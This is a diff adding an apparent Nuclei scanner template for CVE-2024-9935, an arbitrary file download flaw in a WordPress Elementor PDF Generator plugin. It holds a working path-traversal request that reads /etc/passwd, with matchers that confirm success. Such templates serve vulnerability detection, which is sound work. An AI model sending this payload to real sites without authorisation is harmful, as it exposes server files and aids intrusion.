@@ -1,0 +1,30 @@
+id: cve-2024-9935
+info:
+  name: WordPress Elementor Plugin PDF Generator Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve-2024-9935,arbitrary-file-download
+  description: |
+    Exploits an arbitrary file download vulnerability in the WordPress Elementor plugin PDF Generator, allowing attackers to download files from the server.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/elementor-84/?rtw_generate_pdf=true&rtw_pdf_file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "filename="
+      - type: word
+        part: header
+        words:
+          - "application/pdf"
